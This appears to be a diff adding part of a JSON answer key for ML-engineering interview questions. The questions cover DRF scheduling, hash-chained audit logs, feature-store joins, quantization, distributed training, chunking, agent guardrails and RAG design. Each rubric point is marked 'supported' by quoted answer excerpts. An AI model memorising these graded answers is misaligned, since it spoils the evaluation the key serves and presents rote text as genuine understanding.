+          "point": "Schedule the tenant with the lowest dominant share next.",
+          "answerExcerpts": [
+            "The DRF scheduler always picks the tenant with the lowest dominant share and allocates resources to their next waiting job, ensuring max-min fairness across multiple heterogeneous resources."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "DRF balances heterogeneous resources with max-min fairness.",
+          "answerExcerpts": [
+            "The DRF scheduler always picks the tenant with the lowest dominant share and allocates resources to their next waiting job, ensuring max-min fairness across multiple heterogeneous resources."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Fair allocation can leave GPUs idle when the selected jobs cannot use them.",
+          "answerExcerpts": [
+            "The trade-off is cluster-wide throughput versus per-tenant fairness: DRF guarantees that no team starves and encourages honest resource requests, but prioritizing the tenant with the lowest share can leave GPUs idle if that tenant's jobs cannot utilize available hardware."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:gov-audit-trail-tamper-evident",
+      "topic": "safety",
+      "checks": [
+        {
+          "point": "Log identities, prompts, responses, tool arguments and results.",
+          "answerExcerpts": [
+            "Every log record captures the timestamp, session ID, user identity, prompt text, model response, tool invocation arguments, and execution result."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Link each record to the preceding record with a SHA-256 hash.",
+          "answerExcerpts": [
+            "To guarantee integrity, each record includes the SHA-256 hash of the immediately preceding record in the sequence, creating an immutable cryptographic chain."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Verify the chain to detect historical modification or deletion.",
+          "answerExcerpts": [
+            "If any historical record is modified or deleted, the hash chain breaks upon verification."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Store records in append-only Object Lock storage with retention.",
+          "answerExcerpts": [
+            "We stream these signed records to append-only cloud storage with Object Lock enabled, preventing even administrative credentials from deleting logs before retention periods expire."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:feature-store-point-in-time-correctness",
+      "topic": "production-mlops",
+      "checks": [
+        {
+          "point": "Use only feature values known at the historical decision time.",
+          "answerExcerpts": [
+            "Point-in-time correctness ensures that when generating training data for past events, the feature values matched to each label reflect exactly what was known at the historical moment the event occurred."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Future feature values leak labels and inflate offline scores.",
+          "answerExcerpts": [
+            "Point-in-time correctness ensures that when generating training data for past events, the feature values matched to each label reflect exactly what was known at the historical moment the event occurred. Without this, offline models suffer from temporal data leakage. For example, if predicting loan default at the application timestamp of June 1st, using a feature computed on July 1st that reflects subsequent missed payments leaks the future label into training, producing an artificially high validation score that collapses in production. Feature stores solve this using AS OF time-travel joins. Each feature update in the offline store is recorded with an observation timestamp. When generating training sets from an observation table containing entity IDs and event timestamps, the feature store joins the latest feature value whose timestamp is strictly less than or equal to the event timestamp. The trade-off is query complexity and storage volume versus model reliability: maintaining immutable temporal feature logs requires partitioned time-series storage, but it guarantees zero future leakage in training."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "AS OF joins select the latest feature timestamp no later than the event.",
+          "answerExcerpts": [
+            "When generating training sets from an observation table containing entity IDs and event timestamps, the feature store joins the latest feature value whose timestamp is strictly less than or equal to the event timestamp."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Immutable temporal logs add storage and query complexity.",
+          "answerExcerpts": [
+            "The trade-off is query complexity and storage volume versus model reliability: maintaining immutable temporal feature logs requires partitioned time-series storage, but it guarantees zero future leakage in training."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:quant-ptq-vs-qat-activation-outliers",
+      "topic": "gpu-memory-quantization",
+      "checks": [
+        {
+          "point": "Activation outliers expand quantization ranges and crush normal-value precision.",
+          "answerExcerpts": [
+            "Because uniform quantization maps the entire dynamic range into a small integer grid (like INT8 with 256 levels), scaling down to accommodate these massive outliers crushes the precision of normal values, causing severe degradation and perplexity explosions."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "PTQ calibrates without full retraining.",
+          "answerExcerpts": [
+            "In Post-Training Quantization (PTQ), we quantize weights and activations on calibration data without full retraining."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "QAT simulates quantization noise and uses a straight-through gradient estimator.",
+          "answerExcerpts": [
+            "In the forward pass, weights and activations are quantized to low precision to simulate quantization error, but gradients in the backward pass are computed using the Straight-Through Estimator in FP32."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "QAT adds retraining cost while improving tolerance to low precision.",
+          "answerExcerpts": [
+            "In large language models starting around 6 billion parameters, certain hidden state dimensions exhibit extreme activation values—often 20 to 100 times larger than normal activations. In Post-Training Quantization (PTQ), we quantize weights and activations on calibration data without full retraining. Because uniform quantization maps the entire dynamic range into a small integer grid (like INT8 with 256 levels), scaling down to accommodate these massive outliers crushes the precision of normal values, causing severe degradation and perplexity explosions. Quantization-Aware Training (QAT) models quantization noise directly during fine-tuning. In the forward pass, weights and activations are quantized to low precision to simulate quantization error, but gradients in the backward pass are computed using the Straight-Through Estimator in FP32. The model weights learn to suppress activation spikes and distribute information across channels that tolerate low precision. The trade-off is compute cost versus precision: PTQ runs in minutes with zero labeled data, while QAT requires retraining cycles and labeled training sets."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:a2a-supervisor-vs-peer-choreography",
+      "topic": "multi-agent",
+      "checks": [
+        {
+          "point": "Supervisors decompose tasks, delegate and maintain global state.",
+          "answerExcerpts": [
+            "In a hierarchical supervisor architecture, a central coordinator agent receives the primary user request, decomposes it into sub-tasks, assigns work to specialized worker agents, synthesizes their results, and maintains global state."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Peer choreography communicates directly without a central controller.",
+          "answerExcerpts": [
+            "In peer-to-peer agent choreography, agents communicate directly with each other via message buses or direct calls without a central controller, negotiating responsibilities dynamically."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Supervisors can bottleneck while peer messaging risks storms and deadlocks.",
+          "answerExcerpts": [
+            "In multi-agent systems, agents must coordinate to complete complex workflows. In a hierarchical supervisor architecture, a central coordinator agent receives the primary user request, decomposes it into sub-tasks, assigns work to specialized worker agents, synthesizes their results, and maintains global state. Communication is strictly vertical: workers report only to the supervisor. In peer-to-peer agent choreography, agents communicate directly with each other via message buses or direct calls without a central controller, negotiating responsibilities dynamically. Supervisor patterns provide predictable execution, centralized budget tracking, and deterministic debugging, but the supervisor can become a reasoning and token bottleneck. Peer-to-peer patterns allow organic problem solving, but risk circular message storms and deadlocks where Agent A waits for Agent B while Agent B waits for Agent A. To prevent deadlocks, we enforce strict acyclic message graphs using hop counters and timeout deadlines. The trade-off is coordination predictability versus emergent autonomy: supervisors guarantee deterministic completion, while peer choreography offers flexibility for collaborative research tasks."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Bound peer communication with hop counters and timeout deadlines.",
+          "answerExcerpts": [
+            "To prevent deadlocks, we enforce strict acyclic message graphs using hop counters and timeout deadlines."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:dist-ddp-allreduce-synchronous",
+      "topic": "deep-learning",
+      "checks": [
+        {
+          "point": "DDP replicas must apply identical synchronized gradient updates.",
+          "answerExcerpts": [
+            "Gradient synchronization is strictly synchronous because all replicas must apply identical parameter updates at every step to keep weights mathematically identical without diverging."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Bucket gradients and start asynchronous all-reduce as buckets become ready.",
+          "answerExcerpts": [
+            "As soon as backward autograd completes the gradients for a bucket, DDP initiates an asynchronous Ring-AllReduce across all GPUs while earlier layers are still computing gradients."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Overlap communication with remaining backward computation.",
+          "answerExcerpts": [
+            "In Distributed Data Parallel, each GPU holds a full model replica and computes backward gradients on its own data shard. Gradient synchronization is strictly synchronous because all replicas must apply identical parameter updates at every step to keep weights mathematically identical without diverging. To hide communication latency, PyTorch does not wait until the entire backward pass finishes. It organizes parameters into buckets in reverse layer order. As soon as backward autograd completes the gradients for a bucket, DDP initiates an asynchronous Ring-AllReduce across all GPUs while earlier layers are still computing gradients. Ring-AllReduce shares gradients in logical rings of chunks: each GPU sends and receives simultaneously, transferring two times the gradient size divided by the number of ranks. The trade-off is bucket size tuning: large buckets achieve high network bandwidth utilization on InfiniBand, but small buckets start communication earlier to overlap with backward computation."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Large buckets favor bandwidth while small buckets begin overlap sooner.",
+          "answerExcerpts": [
+            "The trade-off is bucket size tuning: large buckets achieve high network bandwidth utilization on InfiniBand, but small buckets start communication earlier to overlap with backward computation."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:coding-chunker-token-aware",
+      "topic": "coding",
+      "checks": [
+        {
+          "point": "Count tokenizer subwords rather than raw characters.",
+          "answerExcerpts": [
+            "We chunk text by counting tokenizer subwords rather than raw characters or words."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Split by paragraphs, then sentences, then words as needed.",
+          "answerExcerpts": [
+            "We try paragraph boundaries first, fall back to sentence endings, and split on words only as a last resort."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Emit at the token limit and retain trailing overlap.",
+          "answerExcerpts": [
+            "When accumulating text into a chunk, once the next sentence would exceed the token limit, we emit the chunk, retain a trailing overlap window of tokens, and continue."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Test oversized sentences, small documents, Unicode and overlap continuity.",
+          "answerExcerpts": [
+            "For testing, we verify edge cases: documents smaller than a single chunk, individual sentences longer than the chunk limit where word splitting is forced, unicode emojis and accents, and exact overlap continuity between adjacent chunks."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "senior:coding-agent-loop-guardrails",
+      "topic": "coding",
+      "checks": [
+        {
+          "point": "Check step and total token budgets during every iteration.",
+          "answerExcerpts": [
+            "We build an autonomous agent runner with deterministic execution guardrails to prevent infinite recursion, runaway token expenditure, and repeated identical tool calls. The runner receives a task and an environment interface. At each iteration, we check whether our step budget has expired. We maintain an in-memory history of tool call signatures composed of the tool name and sorted JSON arguments. If a tool call repeats an identical signature and fails consecutively, we flag an active loop and abort. We track total token consumption across prompt and completion turns, breaking if the budget is breached. Testing covers normal single-step answers, multi-turn tool loops terminating within limits, repeated tool invocation detection, and graceful budget exhaustion returns."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Track tool signatures using names and sorted JSON arguments.",
+          "answerExcerpts": [
+            "We maintain an in-memory history of tool call signatures composed of the tool name and sorted JSON arguments."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Abort repeated consecutive failed tool calls.",
+          "answerExcerpts": [
+            "We build an autonomous agent runner with deterministic execution guardrails to prevent infinite recursion, runaway token expenditure, and repeated identical tool calls. The runner receives a task and an environment interface. At each iteration, we check whether our step budget has expired. We maintain an in-memory history of tool call signatures composed of the tool name and sorted JSON arguments. If a tool call repeats an identical signature and fails consecutively, we flag an active loop and abort. We track total token consumption across prompt and completion turns, breaking if the budget is breached. Testing covers normal single-step answers, multi-turn tool loops terminating within limits, repeated tool invocation detection, and graceful budget exhaustion returns."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Test graceful budget exhaustion and normal completion.",
+          "answerExcerpts": [
+            "Testing covers normal single-step answers, multi-turn tool loops terminating within limits, repeated tool invocation detection, and graceful budget exhaustion returns."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "rag-interview-questions:bcf8b4d2f56d",
+      "topic": "system-design",
+      "checks": [
+        {
+          "point": "Use structural per-tenant index isolation for sensitive legal data.",
+          "answerExcerpts": [
+            "Requirements first: strict per-tenant isolation (structural, not filter-based, given the sensitivity), citation at the passage level since legal answers are worthless without exact attribution, and an audit trail since this is a compliance-sensitive domain."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Enforce passage-level attribution with NLI checks.",
+          "answerExcerpts": [
+            "Requirements first: strict per-tenant isolation (structural, not filter-based, given the sensitivity), citation at the passage level since legal answers are worthless without exact attribution, and an audit trail since this is a compliance-sensitive domain. Architecture: per-tenant index partitions (not a shared index with a filter — the stakes are too high for the HNSW-recall and leakage risks a shared index introduces), citation enforced via NLI-checked attribution at generation time rather than trusted model-reported citations, a late-binding permission check even within a single firm's own multi-user access tiers, and per-query audit logging of user, filter applied, and chunk IDs retrieved. The interview signal here is naming the isolation-model tradeoff explicitly (structural vs. shared-plus-filter) and justifying it against this specific domain's stakes, not defaulting to whichever is cheaper."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Apply late-binding permissions within each firm's access tiers.",
+          "answerExcerpts": [
+            "Architecture: per-tenant index partitions (not a shared index with a filter — the stakes are too high for the HNSW-recall and leakage risks a shared index introduces), citation enforced via NLI-checked attribution at generation time rather than trusted model-reported citations, a late-binding permission check even within a single firm's own multi-user access tiers, and per-query audit logging of user, filter applied, and chunk IDs retrieved."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Audit users, applied filters and retrieved chunk IDs.",
+          "answerExcerpts": [
+            "Architecture: per-tenant index partitions (not a shared index with a filter — the stakes are too high for the HNSW-recall and leakage risks a shared index introduces), citation enforced via NLI-checked attribution at generation time rather than trusted model-reported citations, a late-binding permission check even within a single firm's own multi-user access tiers, and per-query audit logging of user, filter applied, and chunk IDs retrieved."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "repo:system-design:churn-model-system",
+      "topic": "system-design",
+      "checks": [
+        {
+          "point": "Predict 30-day churn and select the top five percent nightly.",
+          "answerExcerpts": [
+            "The task is binary classification: the probability that a user cancels in the next 30 days, so that the nightly job can pick the top 5 percent for an offer."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use batch scoring because fresher online scores are unnecessary.",
+          "answerExcerpts": [
+            "Nightly scores for every user fit batch inference; the lesson's cost model prices one run a day over the user base at under one dollar, while an online service sized for 40 peak QPS costs $24.00 a day for a freshness nobody needs."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Require lift over the idle-days heuristic.",
+          "answerExcerpts": [
+            "The model must beat the idle-days rule by a set lift, ship through shadow and canary stages, and fall back to that rule when anything fails."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Roll out through shadow and canary with heuristic fallback.",
+          "answerExcerpts": [
+            "The model must beat the idle-days rule by a set lift, ship through shadow and canary stages, and fall back to that rule when anything fails."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "rag-interview-questions:91ab7f6540d9",
+      "topic": "rag",
+      "checks": [
+        {
+          "point": "Detect text, tables and images as separate content regions.",
+          "answerExcerpts": [
+            "Content-type-aware chunking, not one strategy applied uniformly: detect text/table/image regions separately (a PDF layout tool can give you bounding boxes), chunk prose sections by header/paragraph boundaries with some overlap, extract tables and serialize them as Markdown rather than mixing table rows into surrounding prose text (they have different embedding characteristics and mixing them degrades both), and run charts/figures through a vision-capable model to generate a text description that gets embedded in place of the image."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Chunk prose by structure with overlap and serialize tables separately.",
+          "answerExcerpts": [
+            "Content-type-aware chunking, not one strategy applied uniformly: detect text/table/image regions separately (a PDF layout tool can give you bounding boxes), chunk prose sections by header/paragraph boundaries with some overlap, extract tables and serialize them as Markdown rather than mixing table rows into surrounding prose text (they have different embedding characteristics and mixing them degrades both), and run charts/figures through a vision-capable model to generate a text description that gets embedded in place of the image."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Generate text descriptions for charts before embedding.",
+          "answerExcerpts": [
+            "Content-type-aware chunking, not one strategy applied uniformly: detect text/table/image regions separately (a PDF layout tool can give you bounding boxes), chunk prose sections by header/paragraph boundaries with some overlap, extract tables and serialize them as Markdown rather than mixing table rows into surrounding prose text (they have different embedding characteristics and mixing them degrades both), and run charts/figures through a vision-capable model to generate a text description that gets embedded in place of the image."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Carry page and section metadata on every chunk.",
+          "answerExcerpts": [
+            "Every chunk should also carry page number and section-title metadata, since financial reports are often queried by location (\"page 47, liquidity risk\") as much as by content."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    },
+    {
+      "questionId": "rag-interview-questions:4b87c24eacc4",
+      "topic": "rag",
+      "checks": [
+        {
+          "point": "Keep graph and source text linked through mutual indexing.",
+          "answerExcerpts": [
+            "KAG adds \"mutual indexing\" (keeping the knowledge graph and the source text tightly linked so reasoning can fall back to raw text when the graph is incomplete) and logical-form-guided reasoning, where parts of a query are answered by deterministic logical operations over the graph rather than leaving everything to free-form LLM generation."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Fall back to source text when graph facts are incomplete.",
+          "answerExcerpts": [
+            "KAG adds \"mutual indexing\" (keeping the knowledge graph and the source text tightly linked so reasoning can fall back to raw text when the graph is incomplete) and logical-form-guided reasoning, where parts of a query are answered by deterministic logical operations over the graph rather than leaving everything to free-form LLM generation."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "Use logical-form-guided deterministic operations for parts of a query.",
+          "answerExcerpts": [
+            "KAG adds \"mutual indexing\" (keeping the knowledge graph and the source text tightly linked so reasoning can fall back to raw text when the graph is incomplete) and logical-form-guided reasoning, where parts of a query are answered by deterministic logical operations over the graph rather than leaving everything to free-form LLM generation."
+          ],
+          "verdict": "supported"
+        },
+        {
+          "point": "KAG targets graph incompleteness and multi-step reasoning reliability.",
+          "answerExcerpts": [
+            "The gap it targets is graph incompleteness and reasoning reliability: plain GraphRAG's community-summarization approach has no mechanism for formally verifiable multi-step reasoning, and nothing to fall back on when the graph itself simply doesn't contain a needed fact."
+          ],
+          "verdict": "supported"
+        }
+      ]
+    }
+  ]
+}
